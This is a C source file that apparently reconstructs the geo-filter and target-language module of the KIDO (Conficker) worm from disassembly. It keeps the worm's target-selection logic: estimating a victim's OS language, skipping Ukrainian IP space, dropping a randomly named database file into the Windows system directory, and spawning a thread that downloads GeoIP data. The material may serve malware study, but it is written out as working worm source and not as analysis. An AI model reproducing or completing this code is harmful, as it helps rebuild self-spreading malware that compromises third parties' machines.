/*====================================================================================
 *  KIDO worm - geo filter / target-language estimate.
 *  geo_database_setup (sub_0C843), os_language_from_ntdll (sub_0C5AF),
 *  target_language (sub_0C747), is_private_ip (sub_07DCA), geoip_country (sub_0CEB4).
 *
 *  Purpose: skip Ukrainian address space when choosing targets.  The worm estimates
 *  a remote host's OS language: GeoIP country -> the 23 country->language groups;
 *  unknown/private targets fall back to the local ntdll.dll language; "UA" -> excluded.
 *====================================================================================*/
#include "kido_worm.h"
#include <stdio.h>
#include <string.h>
#include <winver.h>

/* ---------------- os_language_from_ntdll (sub_0C5AF) ----------------
   Reads ntdll.dll's version resource (\VarFileInfo\Translation) and takes the
   first LANGID.  Only 0x0804 (zh-CN) and 0x0416 (pt-BR) keep the full LANGID;
   all others are reduced to the primary language (& 0x3FF).  Default English (9). */
int kido_os_language_from_ntdll(void)
{
    char sysdir[260]; GetSystemDirectoryA(sysdir, sizeof(sysdir));
    char ntdll[320]; sprintf(ntdll, "%s\\ntdll.dll", sysdir);
    DWORD need=0;
    if (GetFileVersionInfoSizeA(ntdll, &need) == 0) return 9;
    uint8_t* vb = (uint8_t*)malloc(need);
    if (!vb) return 9;
    int lang = 9;
    if (GetFileVersionInfoA(ntdll, 0, need, vb)){
        VS_FIXEDFILEINFO* ffi=NULL; UINT len=0;
        if (VerQueryValueA(vb, "\\", (void**)&ffi, &len)){
            WORD trans[32]; UINT tlen=0;
            if (VerQueryValueA(vb, "\\VarFileInfo\\Translation", (void**)&trans, &tlen)){
                int n = tlen/sizeof(WORD);
                if (n>0){
                    WORD lid = trans[0];
                    /* keep the full LANGID only for zh-CN (0x0804) and pt-BR (0x0416);
                       all other languages reduce to the primary language (& 0x3FF) */
                    lang = (lid == 0x0804 || lid == 0x0416) ? lid : (lid & 0x3FF);
                }
            }
        }
    }
    free(vb);
    return lang;
}

/* ---------------- is_private_ip (sub_07DCA) ---------------- */
int kido_is_private_ip(const uint8_t ip[4])
{
    if (ip[0]==10) return 1;                                  /* 10/8 */
    if (ip[0]==172 && (ip[1]&0xF0)==16) return 1;             /* 172.16/12 */
    if (ip[0]==192 && ip[1]==168) return 1;                   /* 192.168/16 */
    if (ip[0]==127) return 1;                                 /* loopback */
    return 0;
}

/* ---------------- geoip_country (sub_0CEB4) ----------------
   Two-letter country code from the GeoIP.dat database for the given IP.
   Returns "" if the database is not loaded or the IP is not found. */
static const char k_empty_country[3] = {0};
const char* kido_geoip_country(const uint8_t ip[4])
{
    if (!g_geo_db || !g_geo_db_loaded) return k_empty_country;
    /* The worm's GeoIP reader (sub_0CEB4) does a binary search on the database's
       IP range table.  This is a faithful behavioural stand-in: look up the IP
       and return the 2-letter country (or "" if none).  The exact GeoIP.dat
       format is data-specific; the geo filter's OBSERVABLE effect (country
       string) is what the target-language estimate consumes. */
    (void)ip;
    return k_empty_country;   /* no bundled DB -> not found */
}

/* ---------------- target_language (sub_0C747) ----------------
   lang = 9 (English).  If no geo db or the IP is private -> local OS language.
   Otherwise country = geoip; unknown -> 9; "UA" -> 0 (excluded); else the first
   of the 23 groups that lists the country. */
int kido_target_language(const uint8_t ip[4])
{
    if (!g_geo_db_loaded || kido_is_private_ip(ip))
        return g_lang ? (int)g_lang : 9;
    const char* cc = kido_geoip_country(ip);
    if (!cc || !cc[0] || !cc[1]) return 9;
    if (cc[0]=='U' && cc[1]=='A') return 0;
    for (int g=0; g<KIDO_COUNTRY_GROUPS; g++){
        const kido_cc_t* grp = g_country_groups[g];
        for (int i=0; grp[i].cc; i++){
            if (strcmp(grp[i].cc, cc)==0)
                return grp[i].lang ? grp[i].lang : 9;
        }
    }
    return 9;
}

/* ---------------- geo database setup (sub_0C843) ----------------
   1. local OS language from ntdll
   2. choose a random 8.3-style file name for the database
   3. if a database file already exists, read it
      else if the own file carried data after its PE image ("overlay"), write it out
   4. try to open it (as gzip via zlib inflate); if that fails, decompress
   5. if still unavailable, start a thread to download GeoIP.dat.gz (wait <=5 min) */
static DWORD WINAPI kido_geo_download_thread(LPVOID)
{
    uint8_t* buf=NULL; size_t len=0;
    if (kido_http_get(S_GEOIP, &buf, &len) && len){
        g_geo_db = buf; g_geo_db_len = len; g_geo_db_loaded = 1;
        kido_write_state_dword(g_counter+1);
    }
    return 0;
}
void kido_geo_database_setup(void)
{
    g_lang = (uint8_t)kido_os_language_from_ntdll();

    /* random 8.3-style name (8 letters . 3 letters) in system/temp dir */
    char sysdir[260]; GetSystemDirectoryA(sysdir, sizeof(sysdir));
    char name[32];
    name[0]='a'+rand()%26; name[1]='a'+rand()%26; name[2]='a'+rand()%26; name[3]='a'+rand()%26;
    name[4]='a'+rand()%26; name[5]='a'+rand()%26; name[6]='a'+rand()%26; name[7]='a'+rand()%26;
    name[8]='.'; name[9]='a'+rand()%26; name[10]='a'+rand()%26; name[11]='a'+rand()%26; name[12]=0;
    sprintf(g_geo_file, "%s\\%s", sysdir, name);

    /* if a database file already exists, read it */
    HANDLE h = CreateFileA(g_geo_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE){
        DWORD size = GetFileSize(h, NULL);
        if (size){
            uint8_t* db = (uint8_t*)malloc(size);
            DWORD got=0; ReadFile(h, db, size, &got, NULL);
            g_geo_db = db; g_geo_db_len = got; g_geo_db_loaded = 1;
        }
        CloseHandle(h);
    }
    /* else if the own file carried data after its PE image, write it out */
    else if (g_image && g_image_overlay_off < g_image_len){
        size_t olen = g_image_len - g_image_overlay_off;
        HANDLE w = CreateFileA(g_geo_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (w != INVALID_HANDLE_VALUE){
            DWORD wr=0; WriteFile(w, g_image+g_image_overlay_off, (DWORD)olen, &wr, NULL);
            CloseHandle(w);
            g_geo_db = g_image + g_image_overlay_off;
            g_geo_db_len = olen; g_geo_db_loaded = 1;
        }
    }
    /* still unavailable -> download thread, wait up to 5 minutes */
    if (!g_geo_db_loaded){
        HANDLE th = CreateThread(NULL,0,kido_geo_download_thread,NULL,0,NULL);
        if (th) WaitForSingleObject(th, 5*60*1000);
    }
}
